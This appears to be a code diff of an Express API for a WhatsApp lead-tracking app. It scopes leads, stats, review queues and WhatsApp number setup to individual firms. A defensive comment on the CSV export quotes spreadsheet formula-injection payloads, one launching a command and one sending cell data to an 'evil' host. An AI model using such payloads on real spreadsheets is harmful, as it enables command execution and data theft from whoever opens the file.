@@ -2,7 +2,9 @@
 import express from 'express';
 import { all, get, run, kvGet, parseJson } from '../db.js';
 import { config, configSummary } from '../config.js';
-import { getSettings, setSettings, getSetting, DEFAULTS, getJourney } from '../settings.js';
+import { getSettings, setSettings, getSetting, firmDefaults, getJourney } from '../settings.js';
+import { DEFAULT_FIRM_ID, currentFirmId, inFirm, getFirm, listFirms, updateFirm, publicFirm, isDefaultFirm, firmPhoneNumberId, firmWabaId } from '../firms.js';
+import { addFirm } from '../services/firm-setup.js';
 import * as auth from '../services/auth.js';
 import * as leads from '../services/leads.js';
 import * as conv from '../services/conversation.js';
@@ -25,13 +27,20 @@ import { normalizePhone, firstName } from '../util/normalize.js';
 export const apiRouter = express.Router();
 apiRouter.use(express.json({ limit: '1mb' }));
 apiRouter.use(csrfGuard);
+// Which firm a request is for: the X-Firm-Id header the UI sends (?firm= on plain links such as the CSV export),
+// default firm 1. Requests about one lead act for that lead's firm whatever the header says.
+apiRouter.use((req, res, next) => {
+  const firm = getFirm(Number(req.get('x-firm-id') || req.query.firm) || DEFAULT_FIRM_ID) || getFirm(DEFAULT_FIRM_ID);
+  inFirm(firm.id, next);
+});
 
 const wrap = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
 const isSecure = (req) => req.secure || req.get('x-forwarded-proto') === 'https';
 
 // ---------- session ----------
 apiRouter.get('/bootstrap', (req, res) => {
-  res.json({ needsSetup: auth.userCount() === 0, user: auth.publicUser(req.user), app_name: getSetting('app_name'), company_name: getSetting('company_name'), publicUrl: config.publicUrl, brain: config.brain });
+  res.json({ needsSetup: auth.userCount() === 0, user: auth.publicUser(req.user), app_name: getSetting('app_name'), company_name: getSetting('company_name'), publicUrl: config.publicUrl, brain: config.brain,
+    firms: req.user ? listFirms({ activeOnly: true }).map(publicFirm) : [] });
 });
 apiRouter.post('/setup', wrap((req, res) => {
   if (auth.userCount() > 0) return res.status(403).json({ error: 'Setup already completed' });
@@ -61,21 +70,22 @@ apiRouter.get('/events', requireAuth, (req, res) => { addClient(res, req.user); 
 
 // ---------- dashboard ----------
 apiRouter.get('/stats', requireAuth, (req, res) => {
-  const s = leads.stats();
+  const firm = currentFirmId();
+  const s = leads.stats(firm);
   const attention = {
-    humanUnread: leads.listLeads({ mode: 'human', limit: 10, sort: 'last_message_at' }).rows.filter(l => l.unread_count > 0),
-    unassignedProspects: leads.listLeads({ status: 'PROSPECT', assigned: 'none', limit: 10 }).rows,
-    failed: all(`SELECT m.*, l.full_name, l.wa_number FROM messages m JOIN leads l ON l.id = m.lead_id WHERE m.status = 'failed' ORDER BY m.id DESC LIMIT 10`).map(leads.serializeMessage),
+    humanUnread: leads.listLeads({ firm, mode: 'human', limit: 10, sort: 'last_message_at' }).rows.filter(l => l.unread_count > 0),
+    unassignedProspects: leads.listLeads({ firm, status: 'PROSPECT', assigned: 'none', limit: 10 }).rows,
+    failed: all(`SELECT m.*, l.full_name, l.wa_number FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.status = 'failed' ORDER BY m.id DESC LIMIT 10`, firm).map(leads.serializeMessage),
   };
-  const recentAi = all(`SELECT m.*, l.full_name, l.wa_number, l.mode FROM messages m JOIN leads l ON l.id = m.lead_id WHERE m.sender = 'ai' ORDER BY m.id DESC LIMIT 8`).map(leads.serializeMessage);
-  const activity = all(`SELECT a.*, l.full_name, l.wa_number, u.name AS user_name FROM audit a LEFT JOIN leads l ON l.id = a.lead_id LEFT JOIN users u ON u.id = a.user_id ORDER BY a.id DESC LIMIT 25`).map(a => ({ ...a, data: parseJson(a.data) }));
+  const recentAi = all(`SELECT m.*, l.full_name, l.wa_number, l.mode FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.sender = 'ai' ORDER BY m.id DESC LIMIT 8`, firm).map(leads.serializeMessage);
+  const activity = all(`SELECT a.*, l.full_name, l.wa_number, u.name AS user_name FROM audit a LEFT JOIN leads l ON l.id = a.lead_id LEFT JOIN users u ON u.id = a.user_id WHERE a.firm_id = ? ORDER BY a.id DESC LIMIT 25`, firm).map(a => ({ ...a, data: parseJson(a.data) }));
   res.json({ stats: s, attention, recentAi, activity, sheet: sheetStatus(), followups: followupStatus(), webhook: { verifiedAt: kvGet('webhook.verifiedAt'), lastEventAt: kvGet('webhook.lastEventAt') } });
 });
 
 // ---------- leads ----------
 apiRouter.get('/leads', requireAuth, (req, res) => {
   const { status, mode, assigned, q, qualified, limit, offset, sort } = req.query;
-  res.json(leads.listLeads({ status, mode, assigned: assigned === 'me' ? String(req.user.id) : assigned, q, qualified, limit: Math.min(Number(limit) || 200, 1000), offset: Number(offset) || 0, sort }));
+  res.json(leads.listLeads({ firm: currentFirmId(), status, mode, assigned: assigned === 'me' ? String(req.user.id) : assigned, q, qualified, limit: Math.min(Number(limit) || 200, 1000), offset: Number(offset) || 0, sort }));
 });
 apiRouter.post('/leads', requireWriter, wrap((req, res) => {
   const lead = leads.createLead({ wa_number: req.body.wa_number, full_name: req.body.full_name, email: req.body.email, source: 'manual', fields: req.body.fields || {} });
@@ -146,7 +156,7 @@ apiRouter.post('/leads/bulk', requireWriter, wrap((req, res) => {
   res.json({ ok: true, count: n });
 }));
 apiRouter.get('/export/leads.csv', requireAuth, (req, res) => {
-  const rows = leads.listLeads({ limit: 100000 }).rows;
+  const rows = leads.listLeads({ firm: currentFirmId(), limit: 100000 }).rows;
   const cols = ['id', 'full_name', 'wa_number', 'email', 'status', 'mode', 'assigned_to', 'qualified', 'corridor', 'budget', 'timeline', 'configuration', 'funding', 'objective', 'source', 'sheet_row', 'last_inbound_at', 'last_outbound_at', 'last_message_preview', 'created_at'];
   // Spreadsheet formula injection: a lead controls their own WhatsApp profile name, so a name like
   // =cmd|'/c calc'!A1 or =HYPERLINK("http://evil/"&A1) would execute the moment a salesperson opens
@@ -164,11 +174,13 @@ apiRouter.get('/review', requireAuth, (req, res) => {
   const filter = req.query.filter || 'unreviewed';
   const where = { unreviewed: "m.review IS NULL", flagged: "m.review = 'bad'", good: "m.review = 'good'", all: '1=1' }[filter] || '1=1';
   const limit = Math.min(Number(req.query.limit) || 50, 200);
+  const firm = currentFirmId();
   const rows = all(`SELECT m.*, l.full_name, l.wa_number, l.mode, l.status AS lead_status, u.name AS reviewer_name,
       (SELECT body FROM messages i WHERE i.id = m.in_reply_to) AS inbound_body
       FROM messages m JOIN leads l ON l.id = m.lead_id LEFT JOIN users u ON u.id = m.reviewed_by
-      WHERE m.sender = 'ai' AND ${where} ORDER BY m.id DESC LIMIT ?`, limit).map(leads.serializeMessage);
-  const counts = { unreviewed: get(`SELECT COUNT(*) n FROM messages WHERE sender='ai' AND review IS NULL`).n, flagged: get(`SELECT COUNT(*) n FROM messages WHERE sender='ai' AND review='bad'`).n, good: get(`SELECT COUNT(*) n FROM messages WHERE sender='ai' AND review='good'`).n, all: get(`SELECT COUNT(*) n FROM messages WHERE sender='ai'`).n };
+      WHERE l.firm_id = ? AND m.sender = 'ai' AND ${where} ORDER BY m.id DESC LIMIT ?`, firm, limit).map(leads.serializeMessage);
+  const count = (cond) => get(`SELECT COUNT(*) n FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.sender='ai' AND ${cond}`, firm).n;
+  const counts = { unreviewed: count('m.review IS NULL'), flagged: count("m.review='bad'"), good: count("m.review='good'"), all: count('1=1') };
   res.json({ rows, counts });
 });
 apiRouter.post('/messages/:id/review', requireWriter, wrap((req, res) => {
@@ -191,7 +203,7 @@ apiRouter.patch('/users/:id', requireRole('admin'), wrap((req, res) => {
 }));
 
 // ---------- settings & system ----------
-apiRouter.get('/settings', requireAuth, (req, res) => res.json({ settings: getSettings(), defaults: DEFAULTS, config: configSummary(), readOnly: req.user.role !== 'admin' }));
+apiRouter.get('/settings', requireAuth, (req, res) => res.json({ settings: getSettings(), defaults: firmDefaults(), config: configSummary(), firm: publicFirm(currentFirmId()), readOnly: req.user.role !== 'admin' }));
 apiRouter.put('/settings', requireRole('admin'), wrap((req, res) => {
   const before = getSettings();
   const after = setSettings(req.body || {});
@@ -211,7 +223,9 @@ apiRouter.post('/sheet/connect', requireRole('admin'), wrap(async (req, res) => 
   const method = b.method || 'link';                       // link | appsscript | serviceaccount
   const ref = parseSheetRef(b.sheetUrl || b.spreadsheetId || '');
   const spreadsheetId = ref.spreadsheetId || String(b.spreadsheetId || '').trim();
-  const provider = method === 'appsscript' ? 'appsscript' : method === 'serviceaccount' ? 'serviceaccount' : 'publiclink';
+  const provider = method === 'appsscript' ? 'appsscript' : method === 'serviceaccount' ? 'serviceaccount'
+    : method === 'memory' && config.sheets.provider === 'memory' ? 'memory' : 'publiclink'; // memory: the fake sheet of a test run
+  if (provider === 'memory') { setSheetConnection({ provider }); resetSheetProvider(); return res.json({ ok: true, connection: sheetConnectionPublic(), import: await importFromSheet({ userId: req.user.id, force: true }) }); }
   if (!spreadsheetId && provider !== 'appsscript') return res.status(400).json({ error: 'Paste your Google Sheet link (or its id).' });
   const conn = {
     provider, spreadsheetId,
@@ -255,34 +269,87 @@ apiRouter.post('/ai/test', requireRole('admin'), wrap(async (req, res) => { res.
 apiRouter.post('/followups/run', requireRole('admin'), wrap(async (req, res) => { res.json({ result: await runFollowups() }); }));
 apiRouter.post('/scheduler/tick', requireRole('admin'), wrap(async (req, res) => { await runTickNow(); res.json({ ok: true }); }));
 
-// ---------- WhatsApp setup panel ----------
+// ---------- firms ----------
+apiRouter.get('/firms', requireAuth, (req, res) => res.json({ firms: listFirms().map(publicFirm) }));
+apiRouter.post('/firms', requireRole('admin'), wrap((req, res) => {
+  const b = req.body || {};
+  const firm = addFirm({ name: b.name, number: b.display_number || b.number || '', sheet: b.sheet_url || '', leads_tab: b.leads_tab || '' }, { userId: req.user.id });
+  res.json({ firm: publicFirm(firm) });
+}));
+apiRouter.patch('/firms/:id', requireRole('admin'), wrap((req, res) => {
+  const firm = getFirm(Number(req.params.id));
+  if (!firm) return res.status(404).json({ error: 'Firm not found' });
+  const patch = {};
+  for (const k of ['name', 'display_number', 'phone_number_id', 'waba_id', 'active']) if (k in (req.body || {})) patch[k] = req.body[k];
+  // Firm 1's sender is PHONE_NUMBER_ID: changing it here would silently move every live conversation.
+  if (isDefaultFirm(firm.id) && ('phone_number_id' in patch || 'waba_id' in patch)) return res.status(400).json({ error: 'The main firm sends from PHONE_NUMBER_ID / WABA_ID — change those variables in Railway instead.' });
+  const updated = updateFirm(firm.id, patch);
+  leads.audit('firm.update', { userId: req.user.id, firmId: firm.id, data: { fields: Object.keys(patch) } });
+  res.json({ firm: publicFirm(updated) });
+}));
+
+// ---------- WhatsApp setup panel (for the firm the request is for) ----------
+const digitsOf = (v) => String(v || '').replace(/\D/g, '');
+// A number the wizard registered for a firm other than firm 1 becomes that firm's sender straight away.
+function linkNumber(firm, phoneNumberId) {
+  if (!phoneNumberId || isDefaultFirm(firm.id) || firm.phone_number_id) return false;
+  updateFirm(firm.id, { phone_number_id: String(phoneNumberId) });
+  leads.audit('firm.number_linked', { firmId: firm.id, data: { phone_number_id: String(phoneNumberId) } });
+  return true;
+}
 apiRouter.get('/wa/status', requireRole('admin'), wrap(async (req, res) => {
-  const out = { configured: wa.isConfigured(), mock: config.whatsapp.mock };
+  const firm = getFirm(currentFirmId());
+  const pid = firmPhoneNumberId(firm), waba = firmWabaId(firm);
+  const out = { configured: wa.isConfigured() && !!(pid || config.whatsapp.mock), mock: config.whatsapp.mock, firm: publicFirm(firm) };
   const safe = async (k, fn) => { try { out[k] = await fn(); } catch (e) { out[k] = { error: e.message }; } };
   if (config.whatsapp.token || config.whatsapp.mock) {
     await safe('token', () => wa.tokenDebug());
-    if (config.whatsapp.phoneNumberId || config.whatsapp.mock) await safe('phone', () => wa.phoneInfo());
-    if (config.whatsapp.wabaId || config.whatsapp.mock) { await safe('numbers', () => wa.listPhoneNumbers()); await safe('templates', () => wa.listTemplates()); await safe('subscribedApps', () => wa.subscribedApps()); }
+    if (pid || (config.whatsapp.mock && isDefaultFirm(firm.id))) await safe('phone', () => wa.phoneInfo(pid || undefined));
+    if (waba || config.whatsapp.mock) { await safe('numbers', () => wa.listPhoneNumbers(waba)); await safe('templates', () => wa.listTemplates(waba)); await safe('subscribedApps', () => wa.subscribedApps(waba)); }
     await safe('webhook', () => wa.webhookStatus());
   }
+  // This firm's number is already on the WhatsApp Business Account but not linked yet → the UI offers to link it.
+  if (!pid && firm.display_number && Array.isArray(out.numbers?.data)) out.match = out.numbers.data.find(n => digitsOf(n.display_phone_number) === digitsOf(firm.display_number)) || null;
   res.json(out);
 }));
-apiRouter.post('/wa/add-number', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.addPhoneNumber({ cc: req.body.cc || '91', phoneNumber: String(req.body.phone_number || '').replace(/\D/g, ''), verifiedName: req.body.verified_name }) })));
-apiRouter.post('/wa/request-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.requestCode(req.body.phone_number_id || config.whatsapp.phoneNumberId, { method: req.body.method || 'SMS', language: req.body.language || 'en' }) })));
-apiRouter.post('/wa/verify-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.verifyCode(req.body.phone_number_id || config.whatsapp.phoneNumberId, req.body.code) })));
+apiRouter.post('/wa/link-number', requireRole('admin'), wrap(async (req, res) => {
+  const firm = getFirm(currentFirmId());
+  if (isDefaultFirm(firm.id)) return res.status(400).json({ error: 'The main firm sends from PHONE_NUMBER_ID — change it in Railway.' });
+  const updated = updateFirm(firm.id, { phone_number_id: String(req.body.phone_number_id || '') });
+  leads.audit('firm.number_linked', { userId: req.user.id, firmId: firm.id, data: { phone_number_id: updated.phone_number_id } });
+  res.json({ firm: publicFirm(updated) });
+}));
+apiRouter.post('/wa/add-number', requireRole('admin'), wrap(async (req, res) => {
+  const firm = getFirm(currentFirmId());
+  // 10-digit Indian number by default; the firm's own number and name when the form is left blank.
+  const national = digitsOf(req.body.phone_number) || digitsOf(firm.display_number).replace(/^91(?=\d{10}$)/, '');
+  const result = await wa.addPhoneNumber({ cc: req.body.cc || '91', phoneNumber: national, verifiedName: req.body.verified_name || firm.name, wabaId: firmWabaId(firm) });
+  if (!firm.display_number && national) updateFirm(firm.id, { display_number: `+${req.body.cc || '91'}${national}` });
+  const linked = linkNumber(getFirm(firm.id), result?.id);
+  leads.audit('wa.number_added', { userId: req.user.id, firmId: firm.id, data: { number: national, id: result?.id, linked } });
+  res.json({ result, linked, firm: publicFirm(firm.id) });
+}));
+apiRouter.post('/wa/request-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.requestCode(req.body.phone_number_id || firmPhoneNumberId(currentFirmId()), { method: req.body.method || 'SMS', language: req.body.language || 'en' }) })));
+apiRouter.post('/wa/verify-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.verifyCode(req.body.phone_number_id || firmPhoneNumberId(currentFirmId()), req.body.code) })));
 apiRouter.post('/wa/register', requireRole('admin'), wrap(async (req, res) => {
   const pin = String(req.body.pin || '');
   if (!/^\d{6}$/.test(pin)) return res.status(400).json({ error: 'PIN must be 6 digits' });
-  res.json({ result: await wa.registerNumber(req.body.phone_number_id || config.whatsapp.phoneNumberId, pin) });
+  const firm = getFirm(currentFirmId());
+  const pid = req.body.phone_number_id || firmPhoneNumberId(firm);
+  const result = await wa.registerNumber(pid, pin);
+  const linked = linkNumber(firm, pid);
+  leads.audit('wa.number_registered', { userId: req.user.id, firmId: firm.id, data: { phone_number_id: pid, linked } });
+  res.json({ result, linked, firm: publicFirm(firm.id) });
 }));
-apiRouter.post('/wa/subscribe', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.subscribeApp() })));
+apiRouter.post('/wa/subscribe', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.subscribeApp(firmWabaId(currentFirmId())) })));
 apiRouter.post('/wa/configure-webhook', requireRole('admin'), wrap(async (req, res) => {
   if (!config.publicUrl) return res.status(400).json({ error: 'Set PUBLIC_URL first' });
   res.json({ result: await wa.configureWebhook(`${config.publicUrl}/webhook`) });
 }));
 apiRouter.post('/wa/submit-templates', requireRole('admin'), wrap(async (req, res) => {
-  // Creates every journey template on the WABA (MARKETING, quick-reply buttons, {{1}} = first name). Existing names are skipped.
-  const existing = new Set(((await wa.listTemplates()).data || []).map(t => t.name));
+  // Creates every journey template of this firm on its WABA (MARKETING, quick-reply buttons, {{1}} = first name). Existing names are skipped.
+  const waba = firmWabaId(currentFirmId());
+  const existing = new Set(((await wa.listTemplates(waba)).data || []).map(t => t.name));
   const language = getSetting('template_language') || 'en';
   const footer = getSetting('template_footer');
   const results = [];
@@ -291,7 +358,7 @@ apiRouter.post('/wa/submit-templates', requireRole('admin'), wrap(async (req, re
     const components = [{ type: 'BODY', text: step.text, ...(step.text.includes('{{1}}') ? { example: { body_text: [['Hemant']] } } : {}) }];
     if (footer) components.push({ type: 'FOOTER', text: footer });
     if (step.buttons.length) components.push({ type: 'BUTTONS', buttons: step.buttons.map(b => ({ type: 'QUICK_REPLY', text: b })) });
-    try { const r = await wa.createTemplate(undefined, { name: step.template, language, category: 'MARKETING', allow_category_change: true, components }); results.push({ template: step.template, status: r.status || 'submitted', id: r.id }); }
+    try { const r = await wa.createTemplate(waba, { name: step.template, language, category: 'MARKETING', allow_category_change: true, components }); results.push({ template: step.template, status: r.status || 'submitted', id: r.id }); }
     catch (e) { results.push({ template: step.template, status: 'error', error: e.message }); }
   }
   leads.audit('templates.submit', { userId: req.user.id, data: { results } });
@@ -302,7 +369,7 @@ apiRouter.post('/wa/send-test', requireRole('admin'), wrap(async (req, res) => {
   let lead = leads.getLeadByNumber(to) || leads.createLead({ wa_number: to, full_name: req.body.name || 'Test contact', source: 'manual' });
   let msg;
   if (req.body.template) msg = await conv.sendTemplateOut(lead, { name: req.body.template, bodyParams: getSetting('templates_use_name_param') ? [lead.first_name || 'there'] : [], sender: 'human', userId: req.user.id, bodyText: `Test template ${req.body.template}` });
-  else msg = await conv.sendOut(lead, { text: req.body.text || 'Test message from Neopolis LeadDesk', sender: 'human', userId: req.user.id });
+  else msg = await conv.sendOut(lead, { text: req.body.text || `Test message from ${getSetting('company_name')} (LeadDesk)`, sender: 'human', userId: req.user.id });
   res.json({ message: leads.serializeMessage(msg), lead_id: lead.id });
 }));
 apiRouter.post('/wa/simulate-inbound', requireRole('admin'), wrap(async (req, res) => {
@@ -310,7 +377,9 @@ apiRouter.post('/wa/simulate-inbound', requireRole('admin'), wrap(async (req, re
   if (!config.whatsapp.mock && config.env === 'production') return res.status(403).json({ error: 'Only available in mock/development mode' });
   const from = (normalizePhone(req.body.from) || '').replace('+', '');
   if (!from) return res.status(400).json({ error: 'Invalid number' });
-  const n = conv.ingestWebhook({ object: 'whatsapp_business_account', entry: [{ changes: [{ value: { metadata: { phone_number_id: 'MOCK' }, contacts: [{ wa_id: from, profile: { name: req.body.name || '' } }], messages: [{ from, id: 'wamid.SIM.' + Date.now() + Math.random().toString(36).slice(2, 6), timestamp: String(Math.floor(Date.now() / 1000)), type: 'text', text: { body: req.body.text || 'Hi' } }] } }] }] });
+  const firm = getFirm(Number(req.body.firm_id) || currentFirmId());
+  if (!firm) return res.status(400).json({ error: 'Unknown firm' });
+  const n = conv.ingestWebhook({ object: 'whatsapp_business_account', entry: [{ changes: [{ value: { metadata: { phone_number_id: firmPhoneNumberId(firm) || 'MOCK' }, contacts: [{ wa_id: from, profile: { name: req.body.name || '' } }], messages: [{ from, id: 'wamid.SIM.' + Date.now() + Math.random().toString(36).slice(2, 6), timestamp: String(Math.floor(Date.now() / 1000)), type: 'text', text: { body: req.body.text || 'Hi' } }] } }] }] }, { firmId: firm.id });
   res.json({ ok: true, queued: n });
 }));
 
